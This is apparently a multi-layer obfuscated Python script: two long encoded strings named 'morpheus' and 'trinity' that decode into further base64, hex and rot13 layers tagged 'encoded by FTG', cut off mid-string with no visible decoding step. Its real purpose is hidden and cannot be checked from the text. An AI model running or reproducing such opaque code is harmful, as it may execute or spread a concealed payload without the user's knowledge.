
import base64, codecs
morpheus = 'IyBlbmNvZGVkIGJ5DQojIEZURw0KDQppbXBvcnQgYmFzZTY0LCB6bGliLCBjb2RlY3MsIGJpbmFzY2lpDQptb3JwaGV1cyA9ICc2NTRhNzk3NDY2NDY3NDc2MzQzMDY5NTQzNTU4NzM0NDJmNTIzODYxMzI0OTY1NjU3NzUxNzc1Nzc2NDU2NzMxNWE1NzQyNmU2NzU2NTM1MjM0NmI1NjRiNzk1MjUxNzA1Mzc5NTQ2ZDUyNTc2MjRhNzM2YjY5NTI0OTc2NTY1YTQ2NzM2YzY2NzYyYjYzNDU1ODU0MzM3YTdhNjMzNDc1Mzk2ZDQ4NTI0ZDQ2Nzc1MzZiMzU2ZDUyNjM1NDZiNTI2ZDU4NDg2MzJmMmIzMjUwNTkzNTMxNjY2Njc4MzUyZjJmNzY0ODYxMmYyZjM3NjI2NjJmNzQ2YTZlNmU2OTJmMmYyZjYyMzc2MjJiNjU3MTc1NjQzNDJiMmY2ZTY3MzkyZjRmMzMzNDYyNjY0YzUwNjYzMzQyNDUyZjcyNjY2NjY2MzY3NTc1NzQyYjYyMzk2NTUwMmY2MjQ4MmYyZjM2NzgzNTM5NDI1MDM3NzUzODU2NzE3NjUwN2E0ODczNzA0MTc5MmI2MzRmNzQ0NzMxNDM0ZTc4NzM3NTMzNmI1OTQzNzk2NDcxNmQ3NDY2MzkzNzQ0NGY3NjZmMzE0ZTYxN2E1OTYzNzM1MzU5MzM2YzZhMzk2ZDMzNTYyYjM5Nzk3ODc1MmY2OTMxNjQ3MDYzNTU2Yzc2MmY0NDY1MzgzMTcyMzM2OTY1NTc3MDYzNDczNzMzNzkzODMyNzU0ODZhMzQ0YzMyNTk2NTYxMmI2NTY3NjgyYjM1NzQ1NTZmMzIzNzM2NzU2ODc0NDY2NjRmMzE2YzM1NTYzMjczNzE2MzM3NTU0ZDUwMzA2MjQyNGYzMDZmNmI2NTc0NzQ2MTcxMzI1MDVhMzY0YjRiMzM1NjQ1NDY2MTcyNTE1Mjc1NWE0NTMzNTgzNDdhNzQ1MjQ2NjE3MTJiNGI3NzRkNDMzNjY1NDI2Njc2NGEzMTc0N2E0ZTUxNTI1NzU3NmQ3OTRiNTY1NjQ1NjE0Zjc0NmM2MzU2NmY2YzcyMzQzNTMxNGY0NDM4NDc3NzY0NzY0MzM4MzI2ODcxNzI1OTY0NzU3Njc2NGQ0NDUxNzg2NTVhNjQ1NjM0NDczNTUzNzQ0YTJiMzU2MTU0NmQ3MTc0Njk2MzJmMzM3MTY1NjE0MTRkMmYyZjU3NzA1MTZlNTA2NTc4NzM3NDc4Njg1NjU3NTM1ODZjNTg0ZDc5NzQ2NjUwNzk3MjY3NjY1NjVhMzg1NjMyNDM2YTZlNGU2YzVhNGQyZjU2NmYzNDMyMzE2YjM1NTczODY2NjQ3MTc5NDczMjJiNmU3OTU4NjEzMTZiNGQyYjU5NDEyYjMyNzk0NjM5NDU2NTQ1NjE1YTU1MzQ3MzJmNjE1OTRjMzM2OTczNjg2MTRhMzM3MTRiMzczODMyMzE2Zjc4Mzg3OTRjNzM0ODdhMzU0OTUyMzMzMDZkNDU2MzY5MzMzMDU4NGE2NTYyNGE0YzcwNDQ1ODU0NzA1MDQ5Nzg0NzJmNGY2ODMzMzI2NjczNGIzNDY1Mzg0ODZjNTk0ZjY0Njk3NjZjMzI0YTYzNjI3NTY5NGIzNjMwNTM1NDU2NTI0OTRlMzg2YTM3NmIyZjcwNmY2NjM4NzE2NDU0Mzc0MTY2N2E2MzRlMzA1NDM5NTc2YTY4NzU2MTMyNGMzNzRhMzMzNzM1NGM2NzU2Mzk0OTM5MzU0YzUwMzc0OTc2NmI1NjJmMzQ1MjZlNjY1NTM5MmI1NTQ4MmY3NjUwMmIzOTU4NGY0ZTYxNjg2NjY2NDIzNTMwNmI2YjRjNTA0ZjY1NjI1ODRhNzU1OTc4NGQ0NDM4MmI2Yzc3NTAzMDVhMzA0Mzc2NjY1NjcwNjczMzY5NGIzMzMxNzczNzZkNDg0MjUyNzM2ODU4NmI3MTU0NTYzMTY4NTA3MDQ3NzY1NzMxNTc1MjcwNjE0NjU4NzI0NzUwNzI0MjRmNzMzNTRhMzg3OTM3MzU1NjM3Nzc0ODc2NTI1ODYxNTA2YTQ2NzkyZjczNzE2NzU0MzQ2MzUwNjE1NjJmNzA0MTU4MzI0MTM3NzY0MjZlNmU2OTRiNjY1MzY1NTE0ZTc4NDg2NDZkNjE0ZTY1NDk3MTdhNmU1OTc2MzA1NTM4Mzk0ZDJiNzE2MTQ3MzU0ZTc2MzA3NTRmNTEzMTYzNDM3YTJiNTE1MTU5MmYzNjQ3NzI2Mjc5NjY0MzMxMzIzNTZlMzQ3OTdhNGM3NTQ2NDg0YTQyMzczMTQxMzkzOTZiNzU1MDY3NGY3OTU4NzM1MzUwNmQ2ZjYyMzQzNTU0NTI2YTcyNDE2ZTdhNzc1ODY1NmY2ZjZkNjY0MjM5MzIzNzcyNDEyYjJmNDI3MjY2NzczMTM5NTQ3YTRjMmY3OTRkNGEyYjU0NmM2NjQxNjQzMjczMmI2Yjc2MzI0ZTJiNDUyYjJmNDI0NDcwNTI1ODUxMzQ2MTRkMmI3MTU5MmI0YzQ5N2E2ZTJiMmY0MzRhNjc0ZDM4NmQ0YjM0MmY3NjMwNDQzNDZjMzUzNTY2MzU0NTQ0Mzg0NDM5NDE2NTM1NGQ0MzJmMzA2ZDMwNzIzODQyNGU1MTU0Mzk2YzZmNzk2MjZhNDM2NTM2MmI2NjUxNDcyYjRiNDQ2NjY3NzAzNTc4NTMzODVhNDc3NzU4NTc3MjMyNDI1MDM2NmE2YjcwNTk1YTM5NGU2ODU0Njk3ODRlNGYzMzZlNTE1NzY2MzA0NDM4NTI1NjZjNzU1NDMwNGYzOTcwMzE0OTc2MzQyZjMwNDEzNjQyNzU2MTYxMzk3NTQxNjU0Zjc3Nzg2YTRkNTQzMzc2NDM2YTM2NDk3MDM0Njc3Mzc5Nzc0ZTJiNzI0MzQ4MzQ0ODUwMzYzMDUxNzQzMDU1NGI3NjMwNjc3NDJiNDI0ODZkMzA2ZjUwNTk2NzJmNWEzMTQ1NGMyYjRhNjEzNDZkMmI0YTU5MzU1MzMyNDU1NTRlNTc0YzM5NmI2NjRiMmY0NjJmMzI2ODQ4MmI0NzM5NDI2NjM5NjE1MTQxMmY0NjRjNzYzMDUwMzg3NzQxMmI3MDRhMzk2NzM3NmUzMDRhNDczNjQ5MzgzNjU1NjM0MzQ0NDM0ODRiMzY0YTZlMzU2MjZkNzU3MzM3Mzg3NDczNTMzMzQyNDcyZjY3NTIzNDY0MmI2ODU4MzE2ZjY2NmI2NTM3NDM3Mzc5NTQ0ZjQyNjY0Njc1Nzk0YTJiNTc0NTRjNzg2ZTZkNTM0ZDJmMzQ1MjRhMzg0MTUwNzk2Zjc1Mzk0MTRjNjMzNjM2NDEzNzc5NjI0ZjZkNmU1NjY5NzIzNjY5MzI0MTMzMzg1Mzc1NzM0YjJmNTA1MTJmNjg1MDZmNmQ2ZTM0NDU0ZjM5NGI2NjczNmE1MDM4Nzg2OTQ5NjU0MTU0NzY0ZDU1NTY2MzZjMzk0MjRjNGE3NTc1NmI1MTQxNTkyYjU1NTI1NDc4Njg0YzQ1NmM0ZDc3NmQzOTU3Mzk0NDc1NDg0ZjQzNmU3YTMyNjE0YTY2MmY0NTM3NzAyZjM4NTEyZjc5NmM3MTZjMzk0ODJmNDI0ZDY1NmY0NjM4Njk0YjRmNjc0NzM4NDYzOTU5MzUzMTZmNDQ2Mzc0NjQ2YTdhNWEzNjc3NTIzMjYzNDUzNzU5NDYyZjMyNTM0ZjczMzQ2YzQ0NmQ0NDc2NmU2YTM2NTMzODU0NmUzMDU0NTgyYjQ2MzM0NjM5MzI2YTMyNzk3ODUzMzY0OTU5NGEyYjY0NTI1MDM5Njk0NDc5NGI3MjcwNGUzNzVhMzg0Mjc4NzQ2ZjM0NmE2MjY5NjI2MzUyNDU3OTQzNDY3ODc1NmY1ODJmNDUzOTM5NGY3ODQ0MzE2OTRlNjQ1YTQxMmY0NjY1NjE2NTQ2NjQ3OTQ0MzU0MzY4NTczNDMwNzgzMTM0MzkyYjQzNGMzMDM1NTgzMzM3NmM2NjY2NmM0YzUyNWE3NjRhNjY2YTQxNzY1MDc0NGY3NjQ1MzI0YTY4NDM1Mjc4NDMzMzRmNDUzMzM5NmEzMjUyNzY0NDQ2NDEyZjZmNTQzMjc4NGM2ZjRhMmY0YjQ4NTE3YTQzNTA3NzMzMzY3ODU5NDU1YTczNGIyYjQ3MzA1MjRkNDkzNDc3N2EzMjZlNTUzOTU5Njg1MDQ0MmY0NTRjMzg2NjM4NzQzNzU5Mzk2ZTRjNmQ0ZDY2MmI2NzY5NTk3MjM3NDEyZjM0Njc1MjZhNDYzMzZkNzMzMjRhNTE1MzY2MzQ2NzRhNzk1NDUwNDU2OTM0NGMzNDQ0NmUzMDQyNjg3YTU0Njk2YTU4Njc0MjY2NTQ3NzQ1NzQzNjY3NmE2OTU1NzYzNjYxMzQ3MDMxNDI0OTJiNGE2MjM5NDMyZjQzMmY2ZDQyNGEyZjQyNjIyYjQ2NzM0YTc2Mzg0YzM2Nzc0NDMxNTAzNDc2NmM0Mjc2NGE0MzM4MzQ1MTQ2NmU2ZDQxNjU0YzQ1MmY0NTUwMzg1MjU4NTE2Njc3NjI1MjYxMzc0OTM1NDMzNTM0NGUyZjQxMzk3ODRjNzU3NjU0MzkzNjQ3NDg2OTZlMzQ0MTUwNTU2YTc1NDU2ZTczNDIyZjM3Njc2NjM1NmE1NzRmNTMzODY0MzU2ZTU4NGM0NTM3NTM1MzQzNTg3MDQ1NzY3NTU4NjY3MzQzMmY2ZDQ3NjM2NjQxNzUzODU2NDI3NzY2NjY2OTQ4MzU0MzM0NTgzOTZmNDE2MzQ2NzY0NTUxNjM1NDM4NmYzNjQxNmMyYjRkNDQ0MjJmNDE0ODYzNzIzNTZhMzM2ZDQ2NjU0OTRmMzU2MTU3NjMzOTQ1NTA3MTZkNTA2ODQ2NTA1NzYxNTM3MDJmNDY3Njc5NGQ2NDM4Nzc0NDc3NzI2MzUzNGMyYjcyNGE2ZTY2NzM0NTJmNmQ1MDY1Nzc1NDJiMzA2ODQ2NTg3NTUyNGEzODU5NjM1NjM0MzA2NjM4NDg1YTJiNGE2ZDM0NmM2NzRhMmI0ZjQ0MmI0MTQzNjM3NzQ0MzQ0NTYyMzc2ZTUwMzAyYjY3NmU2OTUxNDkyYjRkNjMzNTVhNTgzMjc4NDc1MDc4NTQzNTc0MzY2MjZiNGMyZjZmNjgzODU5NGEzMTc5MzA0MjYzNGY1MjQ3NmU0YjU0NzY2ZTY1MzI2NTJiNjc0OTc5MzkzMTQzNTQ0NTRiNjkyZjM2Nzk3NDc1NTU2OTJmNjg0OTc1N2E0NTc2NTIzNDc4NjIzNTY5NTc1NDM4MzE0NzUwNzM1MDJiNDUyZjcwNDU1MjZhMzQ2YjU0N2E0OTM4NTYzOTM0NGM3NjU5NWEyZjMxNjk0YzJiNTE0NTJmNjI2ZTJiNzc1ODc5NGE3NTZmNTg1NDY2MzA1ODU3MmI3MTYyNjY2OTU3MzQ3OTUwNzc0ZDY1NjE2NjRkMzczODQzNzQ2NDJmNzEzMTM1NDI0ZDQ4NzQ1NTZlNDI0ZjQ1Njg1YTM3MzM1MzU1NjkzNzZjNjQzNjZmMzY0NTY0NTE3MjY5Njc2MjZhNDUyZjQ1NmM2MzZjNzU2NTczNmE1OTQyNGM2YzRjMzg0MzMzNzQ0NzUwNzg2NDM4NmEzMTZkNjU0OTUxMzc0NzcyMzU0ZTczNzgzNzc4NDk2Njc0MzY3ODdhNWE0NzM2NGE0MTJiNjc1ODU1NTc2ZTU0NzI3MTc2NmI0YTJmNTA3NjU2NzkzNTZkNjY3NTRmMmI2ZDQ5NjU0MjZkMzQ2YTRhNzQ1NDc3NDg3NjZhNGY3NjU1NDMyYjQ2MzI0YTM5MmI2MTU1NmQ2NDUxN2E3NjQyNjI3OTUxNGY2ZTRhNTIzNjUxNjgzMTQ4NjUzNzQ2NzU2MzQ1MzI3MDc4NjU0MjRjNzc0MjMzNDc3NzY5NDQzMTUxMzA0YTYzNjk0NjZhNzY3NzQ3Mzk1MjUyNzg0NDQ4MzY0MjY2NGQ0YzM0NTA3NTc0NjU0MjY4MzE0OTZiMmY0NTJmNjMzODM1Njk0ODczNmEzMzM1NGI3NjM1NTczODQyNzM3ODZhMzM2ZDQxMzk0ZTZmNjk1MDU0NjE1NDRmNmY2NjJmNTI0ODcwNGI0ODU0NzE3OTYyNTM2ZTM2NTg0ZDYyNjQ1NjU5MmIzMjQzMmY3ODQxMzMzOTQ2NjY0MjY0NTU1MDZiNTM2YzY5NmU0YjU2NmM0ODM2Njg0ODRhNDIzMTc2NGE1OTM4Nzk1ODMyNGYyYjQ1NjU2YjRhMzE2NzU4NmY3MTZjNTg3MTUwNGY0YTU1NzgyZjY4NGM1NzYzNjY0NDU0Njk2ZTQ1NzY3NTRkNmEzODRkMzU1NzM4NzcyZjdhNDY0ZjZjNTAzODU0NGY3MTM5NGMzNzJiNjk2Mjc4NGI1MDY5NjQ0ZTUzNWEzMDc2Mzk2OTYzMmI3MzU2NjU0NzJmMzA0MTc0Nzc1Mjc2NGYzOTQ4NjY0NTRlNjU2NDYyNmE2MzM2Nzk0NDY0MmI0NjJmNmI0YjY2NDU0ZjUwNmYzOTY2NWEzNzM1NmU1ODZiNTM2NTRjNmU2YTRmNzE3NzQ0Njc0ODRkNGYzODRiNTk2OTZhNmY2ZDUwNDU1MjRkNmU0NTcwMmYzMDQzNzkzODUxNzY0MzRlMmI3MjRhNmQ2YTZkNjQ2MzQ2MzEzMTQyNmU0ZDM2MzQzOTQ0NTg3OTY3NTA1MjZjNTA1NzQ5MzgzMTRjNzY1ODRjNzU2ZjcyMzU2YTUwNmY3Mjc0NzI1MTZlMzgzMTM4NzYzOTYxNGMzNDZkMmI2ODM3Nzc3NDc3NmY3NTRmNGE2Zjc2NmEyYjRkMzk1MzQyNzc2ODRjMzU0ODQ4MzA3NDRmMzE0NTJmNTA2NTQ3NWEyYjZmNDYzNDMxMzgzMjMwNjgzOTY0NTE0NDM4NTQ2YjQ5NDQ3MjQ5MmI0ODZjNmE0ODQ5NTYzNDRjNzk2MzRlMzQ3YTc2MzE0NzZhNGQyYjRmMzk1YTcyNTU0ZjM4Njk1NjRiNjY1NTc5NDU0NDYzNTE0Yzc4MzczMzU0NGM3OTQ2MzM2MzYyNjM1MjU2N2E0MzY2NGQ3Nzc2Mzk0ZjY1NDkyYjQxNTQzNzMwMzgzNTUzNTAzNTcyNDU0NjM0Nzk2ZTc2NGU2ODJmNGY3NTQ5Mzc0ZDY0Nzg2ODUwNGE1NDQ1NTIzOTVhNGE3MjQ1NzU0OTY1Mzg2MTYxNzM1NTYzMzg2NzY0Mzg0Yjc2NmE2ZTQ1NGI2NjZmNzg2MzQyNzY1OTQ5NTg2YzM2Nzg3YTc5NjQ3Mzc3MzY3NzYxNDY3Njc1NWEzNjdhNzY2MTUzMmY2ZDc4Nzc2YTJiNjg0NDY5NTQ1MDRkNTI3YTUxNDczNTRjNzY0ZTQyMmYzNDY0NjY0NTYyNjU1MTcwNzc1YTM5NTUzNDY4NTEzNDRhMzM2ZTJmNWE0OTczNzQ3ODY2MzkzNTZhNzM2ODVhNDQ3YTQxNzY2YTZlNmQ1NjY1NGQ1YTM1Nzg2NTJmNDU2Njc3NjMzNTY0N2E0MTJmNzkzMzZkNGE1YTM3NjE0OTM1Nzc1ODU3NTAzNDY5NGQ0NTJmNTI0Y'
trinity = 'wEzAGL0LmH3AGVmAwL4AzR2BGD1ZmZmAGD5AQt2BQH5AzL0LwZ2AQZ3AwD4AzR1ZQZjAQx0LmZmA2R0AwD1AmNmAwZjAwx2ZmDlZzV2Lwp2AwZ2LwLlAQH1LGZ3Zmp0BQZ5AGL0AwH4ATD0LmZ4AzD1AGplZmt0ZGZ3ZmZmAwWvAwxmAGZlAGZ0LmL1ZmZ0AwLmZmt2BGD1AwH1AGquAmR0LmZ5AGD1ZQZ0ZzL2LmEyZmt0LwZ0AwZlMwH5AGtmZGDlZzLmZQZ2AGxmZmZ0A2RmAwD3AwZmBQH0ZmL1BQEuAmVmZmEyAzH3BQD4ATD2LwZ2Zmx3AGEuZmH0LGZjAwx0MwZjAmHmBGp5AmV3ZGZ3AzL0ZwZ4Awt1BQp3AGNlMwZ1ATZ0MGD4AzH1AGEvAwL2AGDmZmpmAGD1AQD1AmZ2ZmD0LGL2AzL2BQZ3Awp2ZmD3AQx0LwHjAQH2AmWvAGx0AQZlAGN1AmquAQZ3AwD1AwHmZwEvZmLmAQD1AGt0MwZ4Zmx1ZGH5ATZmZGZ2AQH2AGD3AQpmBGLmATV0LmWzAmxmZmMvAJRlLwLkAJR2LwL2AGZmBGZ1AmL0ZmL3AJR0MGWvATV2AwLkZzV0BGL2AwD0LwH4AzZ0AQDkAwtmAGD4AwL3ZwZ1Awx2AwH4AwH2AGEwZmD2AGLmAwZ0LmZ0Awt1ZGp0AmV2LwH2AGN3ZmLlATD0MGp2AzD0LGZ5AJR2LGZ5Awt1ZmD0ZmR3AwExZmDlMwHmAJR1AGp1AzL0AwpmAGR1ZQMuAQp3ZwMvZmN0AwLlZmt3AGEwAGx2LwL2ZmH2LmZmAGpmAQL4AwV3LGD0AmL1AwIuAGp3AGExZmH1AwMxATZ2AQD2AzH3BGH1AGp3Zwp1AGHlLwDlA2R1ZQD0AwZ1ZwHjZmH2AmMuAQp2ZwquAGDlLwMwAzH2LGL4ZzV1BGLlAmt3AmZmAmR2ZGL2AmN0ZwEwZmZ1ZmZ3AzHmZwMvAmN3ZGplATH0AmL2AJR1BQWzAmNmZGZ3AzZ2AwH3ZmR0LwD4AwH2Zmp3AzRmBGD3ZzV1BQZ5AGV2AwZ5AJRmAwp3A2R0ZwDlZmxmAGD0AzV2ZGZ5AQx2AwMwAwZmBQD2AwL3BGp3AmN3ZQZ1AzL1AmEuAwZ2ZwLkAmN2AwWvAQxmAmHjAmN3AGDkAwDlMwH5AGDmAGp3AQp0Amp0Amx0A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